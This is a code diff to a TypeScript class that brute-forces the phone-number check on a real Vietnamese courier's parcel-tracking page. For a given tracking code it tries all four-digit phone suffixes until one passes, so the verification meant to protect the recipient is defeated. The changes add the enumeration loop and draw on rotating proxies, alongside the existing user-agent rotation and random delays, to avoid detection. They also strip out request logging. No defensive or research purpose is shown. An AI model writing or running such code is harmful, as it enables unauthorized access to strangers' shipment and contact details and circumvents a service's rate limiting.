@@ -1,7 +1,7 @@
 import axios, { AxiosInstance } from "axios";
 import { HttpProxyAgent } from 'http-proxy-agent';
 import { HttpsProxyAgent } from 'https-proxy-agent';
-import { ProxyConfig } from "../env";
+import { proxyManager } from "../proxy";
 
 interface AxiosRequestConfig {
   params?: {
@@ -18,16 +18,16 @@ interface AxiosRequestConfig {
 
 export class PhoneBruteForceFinder {
   private baseUrl: string = 'https://jtexpress.vn/vi/tracking';
-  private proxies: ProxyConfig[];
   private currentProxyIndex: number;
+  private attemptCount: number;
   private userAgents: string[];
   private languages: string[];
   private headers: Record<string, string>;
   private client: AxiosInstance;
 
-  constructor(proxies: ProxyConfig[] = []) {
-    this.proxies = proxies;
+  constructor() {
     this.currentProxyIndex = 0;
+    this.attemptCount = 0;
 
     // User-Agent rotation list
     this.userAgents = [
@@ -108,16 +108,14 @@ export class PhoneBruteForceFinder {
    * @returns {Object|null} Proxy config or null if no proxies
    */
   getNextProxy() {
-    if (!this.proxies || this.proxies.length === 0) {
-      return null;
-    }
+    const proxies = proxyManager.getAllProxies();
 
-    const proxy = this.proxies[this.currentProxyIndex];
-    this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;
-    
+    const proxy = proxies[this.currentProxyIndex];
+    this.currentProxyIndex = (this.currentProxyIndex + 1) % proxies.length;
+
     // Parse proxy URL (format: http://ip:port)
     const url = new URL(proxy.server);
-    
+
     return {
       protocol: url.protocol.replace(':', ''),
       hostname: url.hostname,
@@ -164,18 +162,10 @@ export class PhoneBruteForceFinder {
         requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
       }
 
-      // Log request
-      const proxyInfo = proxy ? `[${proxy.hostname}:${proxy.port}]` : '[No Proxy]';
-      console.log(`📤 Request: ${cellphone} ${proxyInfo}`);
-
       const response = await this.client.get(
         this.baseUrl,
         requestConfig
       );
-
-      // Log response
-      const responseStr = JSON.stringify(response.data).substring(0, 200);
-      console.log(`   📧 Response [${response.status}]: ${responseStr}`);
 
       // Check if response contains error message about not finding data
       // Invalid: contains "Không tìm thấy dữ liệu về vận đơn..."
@@ -188,8 +178,6 @@ export class PhoneBruteForceFinder {
           status: 'success',
           isValid: true
         };
-      } else {
-        console.log(`   ❌ ${cellphone} - Invalid (Error message found)`);
       }
 
       return {
@@ -209,31 +197,106 @@ export class PhoneBruteForceFinder {
   }
 
   /**
+   * Check validity of provided phone numbers
+   * @param billcode - Tracking code
+   * @param phones - List of phone numbers to check
+   * @returns Set of valid phone numbers
+   */
+  private async checkProvidedPhones(billcode: string, phones: string[]): Promise<Set<string>> {
+    const validPhonesSet = new Set<string>();
+
+    for (const phone of phones) {
+      const lastFourDigits = String(phone).padStart(4, '0');
+      const result = await this.checkPhoneValidity(billcode, lastFourDigits);
+
+      if (result.isValid) {
+        validPhonesSet.add(lastFourDigits);
+      }
+
+      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
+    }
+
+    return validPhonesSet;
+  }
+
+  /**
+   * Brute force search for valid phone numbers
+   * @param billcode - Tracking code
+   * @param startFrom - Starting number for brute force
+   * @param maxAttempts - Maximum attempts to try
+   * @returns Set of valid phone numbers found
+   */
+  private async bruteForcePhones(
+    billcode: string,
+    startFrom: number,
+    maxAttempts: number
+  ): Promise<Set<string>> {
+    const validPhonesSet = new Set<string>();
+
+    for (let i = startFrom; i < maxAttempts; i++) {
+      const lastFourDigits = String(i).padStart(4, '0');
+      const result = await this.checkPhoneValidity(billcode, lastFourDigits);
+
+      if (result.isValid) {
+        validPhonesSet.add(lastFourDigits);
+        // Return immediately on first valid match
+        return validPhonesSet;
+      }
+
+      this.attemptCount++;
+      this.logBruteForceProgress();
+
+      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
+    }
+
+    return validPhonesSet;
+  }
+
+  /**
+   * Log progress during brute force search
+   */
+  private logBruteForceProgress(): void {
+    if (this.attemptCount % 100 === 0) {
+      console.log(`   ⏱️  Attempted ${this.attemptCount} combinations...`);
+    }
+  }
+
+  /**
+   * Log results of phone search
+   */
+  private logSearchResults(billcode: string, validPhones: Set<string>): void {
+    if (validPhones.size > 0) {
+      console.log(`✅ Valid phones for ${billcode}: ${Array.from(validPhones).join(', ')}`);
+    }
+  }
+
+  /**
     * Main function to find valid phone numbers for a given tracking code
     * @returns {Promise<Object>} Result with valid phones and status
    */
   async findPhone(
     billcode: string,
     phones: string[],
+    startFrom: number = 0,
+    maxAttempts: number = 10000
   ): Promise<{
     status: string;
     billcode: string;
     validPhones: string;
   }> {
+    let validPhonesSet: Set<string>;
 
-    const validPhonesSet = new Set<string>();
-    for (const phone of phones) {
-      const lastFourDigits = String(phone).padStart(4, '0');
-
-      // Check this combination
-      const result = await this.checkPhoneValidity(billcode, lastFourDigits);
-
-      await new Promise(resolve => setTimeout(resolve, this.getRandomDelay()));
-
-      if (result.isValid) {
-        validPhonesSet.add(lastFourDigits);
+    if (startFrom === 0) {
+      validPhonesSet = await this.checkProvidedPhones(billcode, phones);
+      if (validPhonesSet.size  === 0) {
+        console.log(`   🔍 No valid phones found in provided list, starting brute-force search...`);
+        validPhonesSet = await this.bruteForcePhones(billcode, startFrom, maxAttempts);
       }
+    } else {
+      validPhonesSet = await this.bruteForcePhones(billcode, startFrom, maxAttempts);
     }
+
+    this.logSearchResults(billcode, validPhonesSet);
 
     return {
       status: 'success',
